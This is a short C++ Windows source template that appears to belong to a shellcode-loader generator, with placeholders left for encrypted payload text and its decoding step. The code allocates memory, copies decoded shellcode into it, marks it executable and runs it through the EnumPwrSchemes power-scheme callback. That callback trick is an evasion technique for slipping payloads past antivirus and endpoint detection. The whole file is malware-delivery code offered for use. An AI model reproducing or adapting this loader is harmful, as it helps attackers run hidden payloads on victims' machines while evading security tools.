#include <windows.h>
#include <powrprof.h>
#include "base64.h"
#include "syscall.h"


#pragma comment(lib, "PowrProf.lib")

char Ciphertext[] = "<Ciphertext>";

int main() {
	LPVOID addr = VirtualAllocExNuma(GetCurrentProcess(), NULL, sizeof(Ciphertext), MEM_COMMIT, PAGE_READWRITE, 0);

	<decode>

	memcpy(addr, &shellcode[0], sizeof(Ciphertext));

	DWORD pflOldProtect;
	VirtualProtect(addr, sizeof(Ciphertext), PAGE_EXECUTE_READ, &pflOldProtect);


	::EnumPwrSchemes((PWRSCHEMESENUMPROC)addr, NULL);

	return 0;

}